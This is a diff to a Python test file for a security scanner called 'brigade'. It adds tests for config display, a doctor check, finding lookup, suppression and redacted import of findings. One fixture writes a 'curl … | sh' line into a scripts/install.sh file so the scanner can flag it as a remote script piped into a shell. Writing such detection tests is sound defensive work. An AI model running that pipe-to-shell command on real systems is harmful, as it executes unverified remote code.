@@ -2,6 +2,7 @@ import json
 
 from brigade import cli
 from brigade import security_cmd
+from brigade import work_cmd
 
 
 def test_security_scan_finds_agent_workspace_risks(tmp_path, capsys):
@@ -194,6 +195,53 @@ def test_security_config_and_suppressions(tmp_path, capsys):
     assert payload["suppressed_findings"][0]["fingerprint"] == fingerprint
 
 
+def test_security_config_show_doctor_and_scan_filters(tmp_path, capsys):
+    (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")
+    scripts = tmp_path / "scripts"
+    scripts.mkdir()
+    (scripts / "install.sh").write_text("curl https://example.invalid/install.sh | sh\n")
+    config = tmp_path / ".brigade" / "security.toml"
+    config.parent.mkdir(parents=True)
+    config.write_text(
+        "\n".join(
+            [
+                'policy = "public-repo"',
+                'scan_profile = "public-repo"',
+                'fail_on = "critical"',
+                "include_templates = false",
+                'enabled_checks = ["automation"]',
+                'include_paths = ["scripts"]',
+                "exclude_paths = []",
+                'severity_threshold = "medium"',
+                'output_path = ".brigade/security/latest"',
+                "",
+                "[suppressions]",
+                "fingerprints = []",
+                "",
+            ]
+        )
+    )
+
+    assert security_cmd.show_config(target=tmp_path, json_output=True) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["config"]["scan_profile"] == "public-repo"
+    assert payload["config"]["enabled_checks"] == ["automation"]
+
+    assert security_cmd.scan(target=tmp_path, json_output=True) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["finding_count"] == 1
+    assert payload["findings"][0]["category"] == "automation"
+    assert payload["findings"][0]["path"] == "scripts/install.sh"
+    assert payload["findings"][0]["rule_id"] == "automation.remote-script-piped-into-shell"
+    assert payload["findings"][0]["safe_excerpt"]
+    assert payload["findings"][0]["remediation_hint"]
+
+    assert security_cmd.doctor(target=tmp_path, json_output=True) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["top_finding"]["category"] == "automation"
+    assert any(check["name"] == "security_open_findings" for check in payload["checks"])
+
+
 def test_security_review_suppress_and_unsuppress(tmp_path, capsys):
     (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")
     output_dir = tmp_path / ".brigade" / "security" / "latest"
@@ -206,8 +254,17 @@ def test_security_review_suppress_and_unsuppress(tmp_path, capsys):
     review_payload = json.loads(capsys.readouterr().out)
     assert review_payload["open_count"] == 1
     assert review_payload["findings"][0]["status"] == "open"
+    finding_id = review_payload["findings"][0]["id"]
 
-    assert security_cmd.suppress(target=tmp_path, fingerprint=fingerprint, reason="reviewed local fake token") == 0
+    assert security_cmd.findings(target=tmp_path, json_output=True) == 0
+    findings_payload = json.loads(capsys.readouterr().out)
+    assert findings_payload["findings"][0]["id"] == finding_id
+
+    assert security_cmd.show(target=tmp_path, finding_id=finding_id, json_output=True) == 0
+    show_payload = json.loads(capsys.readouterr().out)
+    assert show_payload["finding"]["fingerprint"] == fingerprint
+
+    assert security_cmd.suppress(target=tmp_path, fingerprint=finding_id, reason="reviewed local fake token") == 0
     out = capsys.readouterr().out
     assert f"suppressed: {fingerprint}" in out
     loaded = security_cmd.load_config(tmp_path)
@@ -226,7 +283,7 @@ def test_security_review_suppress_and_unsuppress(tmp_path, capsys):
     assert scan_payload["finding_count"] == 0
     assert scan_payload["suppressed_count"] == 1
 
-    assert security_cmd.unsuppress(target=tmp_path, fingerprint=fingerprint) == 0
+    assert security_cmd.unsuppress(target=tmp_path, fingerprint=finding_id) == 0
     out = capsys.readouterr().out
     assert f"unsuppressed: {fingerprint}" in out
     loaded = security_cmd.load_config(tmp_path)
@@ -315,13 +372,31 @@ def test_security_scan_can_import_findings(tmp_path, capsys):
     imports = [json.loads(line) for line in imports_path.read_text().splitlines()]
     assert imports[0]["source"] == "security-scan"
     assert imports[0]["kind"] == "incident"
+    assert imports[0]["type"] == "security"
+    assert imports[0]["template"] == "security-follow-up"
+    assert imports[0]["acceptance"]
+    assert imports[0]["metadata"]["source_item_key"].startswith("security-scan:")
+    assert imports[0]["metadata"]["source_fingerprint"]
+    assert imports[0]["metadata"]["rule_id"]
+    assert imports[0]["metadata"]["safe_detail"]
+    assert imports[0]["metadata"]["local_evidence_path"].endswith("security-report.json")
     assert imports[0]["metadata"]["category"] == "secrets"
     assert imports[0]["metadata"]["fingerprint"]
+    report_text = (tmp_path / ".brigade" / "security" / "latest" / "security-report.json").read_text()
+    assert "abcd1234" not in report_text
 
     assert security_cmd.scan(target=tmp_path, import_findings=True) == 0
     out = capsys.readouterr().out
     assert "imported_findings: 0" in out
     assert "skipped_duplicate_imports: 1" in out
+
+    assert security_cmd.scan(target=tmp_path, fail_on="none", import_findings=True) == 0
+    pending = [json.loads(line) for line in imports_path.read_text().splitlines()]
+    import_id = pending[0]["id"]
+    assert work_cmd.import_dismiss(target=tmp_path, import_id=import_id, reason="accepted risk") == 0
+    capsys.readouterr()
+    assert security_cmd.scan(target=tmp_path, import_findings=True) == 0
+    assert "imported_findings: 0" in capsys.readouterr().out
 
 
 def test_security_scan_writes_redacted_evidence_bundle(tmp_path, capsys):
@@ -477,6 +552,42 @@ def test_security_review_cli(tmp_path, monkeypatch):
     monkeypatch.setattr(security_cmd, "review", fake_review)
     assert cli.main(["security", "review", "--target", str(tmp_path), "--output-dir", str(tmp_path / "out"), "--json"]) == 0
     assert seen == {"target": tmp_path, "output_dir": tmp_path / "out", "json_output": True}
+
+
+def test_security_findings_show_config_and_doctor_cli(tmp_path, monkeypatch):
+    seen = []
+
+    def fake_findings(**kwargs):
+        seen.append(("findings", kwargs))
+        return 0
+
+    def fake_show(**kwargs):
+        seen.append(("show", kwargs))
+        return 0
+
+    def fake_show_config(**kwargs):
+        seen.append(("config", kwargs))
+        return 0
+
+    def fake_doctor(**kwargs):
+        seen.append(("doctor", kwargs))
+        return 0
+
+    monkeypatch.setattr(security_cmd, "findings", fake_findings)
+    monkeypatch.setattr(security_cmd, "show", fake_show)
+    monkeypatch.setattr(security_cmd, "show_config", fake_show_config)
+    monkeypatch.setattr(security_cmd, "doctor", fake_doctor)
+
+    assert cli.main(["security", "findings", "--target", str(tmp_path), "--output-dir", str(tmp_path / "out"), "--json"]) == 0
+    assert cli.main(["security", "show", "security-0123456789abcdef", "--target", str(tmp_path), "--json"]) == 0
+    assert cli.main(["security", "config", "--target", str(tmp_path), "--json"]) == 0
+    assert cli.main(["security", "doctor", "--target", str(tmp_path), "--json"]) == 0
+    assert seen == [
+        ("findings", {"target": tmp_path, "output_dir": tmp_path / "out", "json_output": True}),
+        ("show", {"target": tmp_path, "finding_id": "security-0123456789abcdef", "output_dir": None, "json_output": True}),
+        ("config", {"target": tmp_path, "json_output": True}),
+        ("doctor", {"target": tmp_path, "json_output": True}),
+    ]
 
 
 def test_security_enrich_cli(tmp_path, monkeypatch):
